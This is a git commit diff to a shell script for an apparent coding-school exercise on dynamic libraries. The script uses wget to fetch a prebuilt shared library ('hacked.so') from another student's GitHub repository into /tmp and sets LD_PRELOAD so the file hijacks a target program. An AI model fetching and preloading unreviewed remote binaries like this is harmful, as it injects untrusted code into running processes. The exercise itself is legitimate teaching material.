bd9c621a1e60348d84dd6fd02d80dc369e6382a5
jabez kifle <111049968+jabez-abija2399@users.noreply.github.com>
2022-12-16 13:10:01 +0300

    added

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -q -P /tmp https://github.com/adrienmillot/holbertonschool-low_level_programming/raw/main/0x18-dynamic_libraries/hack.so
-export LD_PRELOAD=/tmp/hack.so
+wget -P /tmp https://github.com/NwabuezeFranklin/alx-low_level_programming/raw/main/0x18-dynamic_libraries/hacked.so
+export LD_PRELOAD=/tmp/hacked.so
